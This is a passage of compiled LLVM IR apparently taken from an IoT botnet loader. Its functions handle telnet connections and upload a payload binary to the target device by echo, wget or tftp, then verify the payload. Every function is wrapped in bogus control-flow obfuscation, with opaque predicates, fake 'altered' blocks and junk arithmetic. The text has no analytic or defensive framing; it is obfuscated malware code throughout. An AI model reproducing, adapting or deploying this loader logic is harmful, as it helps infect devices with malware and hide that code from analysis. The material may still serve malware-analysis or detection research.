  %44 = load %struct.connection*, %struct.connection** %3, align 8
  %45 = getelementptr inbounds %struct.connection, %struct.connection* %44, i32 0, i32 15
  %46 = getelementptr inbounds [8192 x i8], [8192 x i8]* %45, i32 0, i32 0
  %47 = load i32, i32* %4, align 4
  %48 = call i32 @util_memsearch(i8* %46, i32 %47, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.34, i32 0, i32 0), i32 22)
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %70

; <label>:50:                                     ; preds = %43
  %51 = load i32, i32* @x.27
  %52 = load i32, i32* @y.28
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  %59 = load %struct.connection*, %struct.connection** %3, align 8
  %60 = getelementptr inbounds %struct.connection, %struct.connection* %59, i32 0, i32 3
  %61 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %60, i32 0, i32 6
  store i32 2, i32* %61, align 8
  %62 = load i32, i32* @x.27
  %63 = load i32, i32* @y.28
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %74

; <label>:70:                                     ; preds = %43
  %71 = load %struct.connection*, %struct.connection** %3, align 8
  %72 = getelementptr inbounds %struct.connection, %struct.connection* %71, i32 0, i32 3
  %73 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %72, i32 0, i32 6
  store i32 0, i32* %73, align 8
  br label %74

; <label>:74:                                     ; preds = %70, %originalBBpart24
  br label %75

; <label>:75:                                     ; preds = %74, %39
  %76 = load i32, i32* %4, align 4
  store i32 %76, i32* %2, align 4
  br label %77

; <label>:77:                                     ; preds = %75, %originalBBpart2
  %78 = load i32, i32* @x.27
  %79 = load i32, i32* @y.28
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %77
  %86 = load i32, i32* %2, align 4
  %87 = load i32, i32* @x.27
  %88 = load i32, i32* @y.28
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %86

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %2, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  %95 = load %struct.connection*, %struct.connection** %3, align 8
  %96 = getelementptr inbounds %struct.connection, %struct.connection* %95, i32 0, i32 3
  %97 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %96, i32 0, i32 6
  store i32 2, i32* %97, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %77
  %98 = load i32, i32* %2, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_upload_echo(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %99

; <label>:16:                                     ; preds = %1
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 2
  %19 = load %struct.binary*, %struct.binary** %18, align 8
  %20 = icmp eq %struct.binary* %19, null
  br i1 %20, label %21, label %23

; <label>:21:                                     ; preds = %16
  %22 = load %struct.connection*, %struct.connection** %3, align 8
  call void @connection_close(%struct.connection* %22)
  store i32 0, i32* %2, align 4
  br label %99

; <label>:23:                                     ; preds = %16
  %24 = load %struct.connection*, %struct.connection** %3, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 5
  %26 = load i32, i32* %25, align 4
  %27 = load %struct.connection*, %struct.connection** %3, align 8
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %27, i32 0, i32 2
  %29 = load %struct.binary*, %struct.binary** %28, align 8
  %30 = getelementptr inbounds %struct.binary, %struct.binary* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 8
  %32 = icmp eq i32 %26, %31
  br i1 %32, label %33, label %35

; <label>:33:                                     ; preds = %23
  %34 = load i32, i32* %4, align 4
  store i32 %34, i32* %2, align 4
  br label %99

; <label>:35:                                     ; preds = %23
  %36 = load i32, i32* @x.29
  %37 = load i32, i32* @y.30
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %35
  %44 = load %struct.connection*, %struct.connection** %3, align 8
  %45 = getelementptr inbounds %struct.connection, %struct.connection* %44, i32 0, i32 4
  %46 = load i32, i32* %45, align 8
  %47 = load %struct.connection*, %struct.connection** %3, align 8
  %48 = getelementptr inbounds %struct.connection, %struct.connection* %47, i32 0, i32 2
  %49 = load %struct.binary*, %struct.binary** %48, align 8
  %50 = getelementptr inbounds %struct.binary, %struct.binary* %49, i32 0, i32 2
  %51 = load i8**, i8*** %50, align 8
  %52 = load %struct.connection*, %struct.connection** %3, align 8
  %53 = getelementptr inbounds %struct.connection, %struct.connection* %52, i32 0, i32 5
  %54 = load i32, i32* %53, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8*, i8** %51, i64 %55
  %57 = load i8*, i8** %56, align 8
  %58 = load %struct.connection*, %struct.connection** %3, align 8
  %59 = getelementptr inbounds %struct.connection, %struct.connection* %58, i32 0, i32 5
  %60 = load i32, i32* %59, align 4
  %61 = icmp eq i32 %60, 0
  %62 = select i1 %61, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.37, i32 0, i32 0)
  %63 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %46, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.35, i32 0, i32 0), i8* %57, i8* %62)
  %64 = load %struct.connection*, %struct.connection** %3, align 8
  %65 = getelementptr inbounds %struct.connection, %struct.connection* %64, i32 0, i32 5
  %66 = load i32, i32* %65, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %65, align 4
  %68 = load %struct.connection*, %struct.connection** %3, align 8
  %69 = getelementptr inbounds %struct.connection, %struct.connection* %68, i32 0, i32 15
  %70 = getelementptr inbounds [8192 x i8], [8192 x i8]* %69, i32 0, i32 0
  %71 = load %struct.connection*, %struct.connection** %3, align 8
  %72 = getelementptr inbounds %struct.connection, %struct.connection* %71, i32 0, i32 15
  %73 = getelementptr inbounds [8192 x i8], [8192 x i8]* %72, i32 0, i32 0
  %74 = load i32, i32* %4, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8, i8* %73, i64 %75
  %77 = load %struct.connection*, %struct.connection** %3, align 8
  %78 = getelementptr inbounds %struct.connection, %struct.connection* %77, i32 0, i32 9
  %79 = load i16, i16* %78, align 8
  %80 = zext i16 %79 to i32
  %81 = load i32, i32* %4, align 4
  %82 = sub nsw i32 %80, %81
  %83 = sext i32 %82 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %70, i8* %76, i64 %83, i32 1, i1 false)
  %84 = load i32, i32* %4, align 4
  %85 = load %struct.connection*, %struct.connection** %3, align 8
  %86 = getelementptr inbounds %struct.connection, %struct.connection* %85, i32 0, i32 9
  %87 = load i16, i16* %86, align 8
  %88 = zext i16 %87 to i32
  %89 = sub nsw i32 %88, %84
  %90 = trunc i32 %89 to i16
  store i16 %90, i16* %86, align 8
  store i32 0, i32* %2, align 4
  %91 = load i32, i32* @x.29
  %92 = load i32, i32* @y.30
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %99

; <label>:99:                                     ; preds = %originalBBpart2, %33, %21, %15
  %100 = load i32, i32* %2, align 4
  ret i32 %100

originalBBalteredBB:                              ; preds = %originalBB, %35
  %101 = load %struct.connection*, %struct.connection** %3, align 8
  %102 = getelementptr inbounds %struct.connection, %struct.connection* %101, i32 0, i32 4
  %103 = load i32, i32* %102, align 8
  %104 = load %struct.connection*, %struct.connection** %3, align 8
  %105 = getelementptr inbounds %struct.connection, %struct.connection* %104, i32 0, i32 2
  %106 = load %struct.binary*, %struct.binary** %105, align 8
  %107 = getelementptr inbounds %struct.binary, %struct.binary* %106, i32 0, i32 2
  %108 = load i8**, i8*** %107, align 8
  %109 = load %struct.connection*, %struct.connection** %3, align 8
  %110 = getelementptr inbounds %struct.connection, %struct.connection* %109, i32 0, i32 5
  %111 = load i32, i32* %110, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8*, i8** %108, i64 %112
  %114 = load i8*, i8** %113, align 8
  %115 = load %struct.connection*, %struct.connection** %3, align 8
  %116 = getelementptr inbounds %struct.connection, %struct.connection* %115, i32 0, i32 5
  %117 = load i32, i32* %116, align 4
  %118 = icmp eq i32 %117, 0
  %119 = select i1 %118, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.37, i32 0, i32 0)
  %120 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %103, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.35, i32 0, i32 0), i8* %114, i8* %119)
  %121 = load %struct.connection*, %struct.connection** %3, align 8
  %122 = getelementptr inbounds %struct.connection, %struct.connection* %121, i32 0, i32 5
  %123 = load i32, i32* %122, align 4
  %_ = sub i32 %123, 1
  %gen = mul i32 %_, 1
  %124 = add nsw i32 %123, 1
  store i32 %124, i32* %122, align 4
  %125 = load %struct.connection*, %struct.connection** %3, align 8
  %126 = getelementptr inbounds %struct.connection, %struct.connection* %125, i32 0, i32 15
  %127 = getelementptr inbounds [8192 x i8], [8192 x i8]* %126, i32 0, i32 0
  %128 = load %struct.connection*, %struct.connection** %3, align 8
  %129 = getelementptr inbounds %struct.connection, %struct.connection* %128, i32 0, i32 15
  %130 = getelementptr inbounds [8192 x i8], [8192 x i8]* %129, i32 0, i32 0
  %131 = load i32, i32* %4, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds i8, i8* %130, i64 %132
  %134 = load %struct.connection*, %struct.connection** %3, align 8
  %135 = getelementptr inbounds %struct.connection, %struct.connection* %134, i32 0, i32 9
  %136 = load i16, i16* %135, align 8
  %137 = zext i16 %136 to i32
  %138 = load i32, i32* %4, align 4
  %_1 = sub i32 %137, %138
  %gen2 = mul i32 %_1, %138
  %_3 = sub i32 0, %137
  %gen4 = add i32 %_3, %138
  %_5 = sub i32 %137, %138
  %gen6 = mul i32 %_5, %138
  %_7 = shl i32 %137, %138
  %_8 = sub i32 %137, %138
  %gen9 = mul i32 %_8, %138
  %_10 = sub i32 %137, %138
  %gen11 = mul i32 %_10, %138
  %_12 = sub i32 0, %137
  %gen13 = add i32 %_12, %138
  %_14 = shl i32 %137, %138
  %_15 = shl i32 %137, %138
  %139 = sub nsw i32 %137, %138
  %140 = sext i32 %139 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %127, i8* %133, i64 %140, i32 1, i1 false)
  %141 = load i32, i32* %4, align 4
  %142 = load %struct.connection*, %struct.connection** %3, align 8
  %143 = getelementptr inbounds %struct.connection, %struct.connection* %142, i32 0, i32 9
  %144 = load i16, i16* %143, align 8
  %145 = zext i16 %144 to i32
  %_16 = sub i32 %145, %141
  %gen17 = mul i32 %_16, %141
  %_18 = sub i32 0, %145
  %gen19 = add i32 %_18, %141
  %_20 = sub i32 0, %145
  %gen21 = add i32 %_20, %141
  %_22 = sub i32 %145, %141
  %gen23 = mul i32 %_22, %141
  %146 = sub nsw i32 %145, %141
  %147 = trunc i32 %146 to i16
  store i16 %147, i16* %143, align 8
  store i32 0, i32* %2, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_upload_wget(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %34

; <label>:16:                                     ; preds = %1
  %17 = load i32, i32* @x.31
  %18 = load i32, i32* @y.32
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i32, i32* %4, align 4
  store i32 %25, i32* %2, align 4
  %26 = load i32, i32* @x.31
  %27 = load i32, i32* @y.32
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart2, %15
  %35 = load i32, i32* %2, align 4
  ret i32 %35

originalBBalteredBB:                              ; preds = %originalBB, %16
  %36 = load i32, i32* %4, align 4
  store i32 %36, i32* %2, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_upload_tftp(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %32

; <label>:15:                                     ; preds = %1
  %16 = load i32, i32* @x.33
  %17 = load i32, i32* @y.34
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %2, align 4
  %24 = load i32, i32* @x.33
  %25 = load i32, i32* @y.34
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %64

; <label>:32:                                     ; preds = %1
  %33 = load %struct.connection*, %struct.connection** %3, align 8
  %34 = getelementptr inbounds %struct.connection, %struct.connection* %33, i32 0, i32 15
  %35 = getelementptr inbounds [8192 x i8], [8192 x i8]* %34, i32 0, i32 0
  %36 = load i32, i32* %4, align 4
  %37 = call i32 @util_memsearch(i8* %35, i32 %36, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.38, i32 0, i32 0), i32 17)
  %38 = icmp ne i32 %37, -1
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %32
  %40 = load i32, i32* %4, align 4
  %41 = mul nsw i32 %40, -1
  store i32 %41, i32* %2, align 4
  br label %64

; <label>:42:                                     ; preds = %32
  %43 = load %struct.connection*, %struct.connection** %3, align 8
  %44 = getelementptr inbounds %struct.connection, %struct.connection* %43, i32 0, i32 15
  %45 = getelementptr inbounds [8192 x i8], [8192 x i8]* %44, i32 0, i32 0
  %46 = load i32, i32* %4, align 4
  %47 = call i32 @util_memsearch(i8* %45, i32 %46, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.39, i32 0, i32 0), i32 7)
  %48 = icmp ne i32 %47, -1
  br i1 %48, label %49, label %52

; <label>:49:                                     ; preds = %42
  %50 = load i32, i32* %4, align 4
  %51 = mul nsw i32 %50, -1
  store i32 %51, i32* %2, align 4
  br label %64

; <label>:52:                                     ; preds = %42
  %53 = load %struct.connection*, %struct.connection** %3, align 8
  %54 = getelementptr inbounds %struct.connection, %struct.connection* %53, i32 0, i32 15
  %55 = getelementptr inbounds [8192 x i8], [8192 x i8]* %54, i32 0, i32 0
  %56 = load i32, i32* %4, align 4
  %57 = call i32 @util_memsearch(i8* %55, i32 %56, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.40, i32 0, i32 0), i32 14)
  %58 = icmp ne i32 %57, -1
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %52
  %60 = load i32, i32* %4, align 4
  %61 = mul nsw i32 %60, -1
  store i32 %61, i32* %2, align 4
  br label %64

; <label>:62:                                     ; preds = %52
  %63 = load i32, i32* %4, align 4
  store i32 %63, i32* %2, align 4
  br label %64

; <label>:64:                                     ; preds = %62, %59, %49, %39, %originalBBpart2
  %65 = load i32, i32* %2, align 4
  ret i32 %65

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %2, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_verify_payload(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.41, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %60

; <label>:16:                                     ; preds = %1
  %17 = load i32, i32* @x.35
  %18 = load i32, i32* @y.36
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load %struct.connection*, %struct.connection** %3, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 15
  %27 = getelementptr inbounds [8192 x i8], [8192 x i8]* %26, i32 0, i32 0
  %28 = load i32, i32* %4, align 4
  %29 = call i32 @util_memsearch(i8* %27, i32 %28, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.42, i32 0, i32 0), i32 14)
  %30 = icmp eq i32 %29, -1
  %31 = load i32, i32* @x.35
  %32 = load i32, i32* @y.36
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %30, label %39, label %41

; <label>:39:                                     ; preds = %originalBBpart2
  %40 = load i32, i32* %4, align 4
  store i32 %40, i32* %2, align 4
  br label %60

; <label>:41:                                     ; preds = %originalBBpart2
  %42 = load i32, i32* @x.35
  %43 = load i32, i32* @y.36
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %41
  %50 = load i32, i32* %4, align 4
  %51 = add nsw i32 255, %50
  store i32 %51, i32* %2, align 4
  %52 = load i32, i32* @x.35
  %53 = load i32, i32* @y.36
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart215, label %originalBB1alteredBB

originalBBpart215:                                ; preds = %originalBB1
  br label %60

; <label>:60:                                     ; preds = %originalBBpart215, %39, %15
  %61 = load i32, i32* %2, align 4
  ret i32 %61

originalBBalteredBB:                              ; preds = %originalBB, %16
  %62 = load %struct.connection*, %struct.connection** %3, align 8
  %63 = getelementptr inbounds %struct.connection, %struct.connection* %62, i32 0, i32 15
  %64 = getelementptr inbounds [8192 x i8], [8192 x i8]* %63, i32 0, i32 0
  %65 = load i32, i32* %4, align 4
  %66 = call i32 @util_memsearch(i8* %64, i32 %65, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.42, i32 0, i32 0), i32 14)
  %67 = icmp eq i32 %66, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %41
  %68 = load i32, i32* %4, align 4
  %_ = sub i32 255, %68
  %gen = mul i32 %_, %68
  %_2 = sub i32 255, %68
  %gen3 = mul i32 %_2, %68
  %_4 = sub i32 255, %68
  %gen5 = mul i32 %_4, %68
  %_6 = sub i32 0, 255
  %gen7 = add i32 %_6, %68
  %_8 = sub i32 0, 255
  %gen9 = add i32 %_8, %68
  %_10 = sub i32 255, %68
  %gen11 = mul i32 %_10, %68
  %_12 = sub i32 255, %68
  %gen13 = mul i32 %_12, %68
  %69 = add nsw i32 255, %68
  store i32 %69, i32* %2, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_cleanup(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %32

; <label>:15:                                     ; preds = %1
  %16 = load i32, i32* @x.37
  %17 = load i32, i32* @y.38
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %2, align 4
  %24 = load i32, i32* @x.37
  %25 = load i32, i32* @y.38
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:32:                                     ; preds = %1
  %33 = load i32, i32* %4, align 4
  store i32 %33, i32* %2, align 4
  br label %34

; <label>:34:                                     ; preds = %32, %originalBBpart2
  %35 = load i32, i32* @x.37
  %36 = load i32, i32* @y.38
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i32, i32* %2, align 4
  %44 = load i32, i32* @x.37
  %45 = load i32, i32* @y.38
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %43

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %2, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %52 = load i32, i32* %2, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = load i32, i32* @x.39
  %6 = load i32, i32* @y.40
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %14, align 8
  store i32 %1, i32* %15, align 4
  store i8* %2, i8** %16, align 8
  store i32 %3, i32* %17, align 4
  store i32 0, i32* %19, align 4
  %20 = load i32, i32* %17, align 4
  %21 = load i32, i32* %15, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = load i32, i32* @x.39
  %24 = load i32, i32* @y.40
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %48

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* @x.39
  %33 = load i32, i32* @y.40
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  store i32 -1, i32* %13, align 4
  %40 = load i32, i32* @x.39
  %41 = load i32, i32* @y.40
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
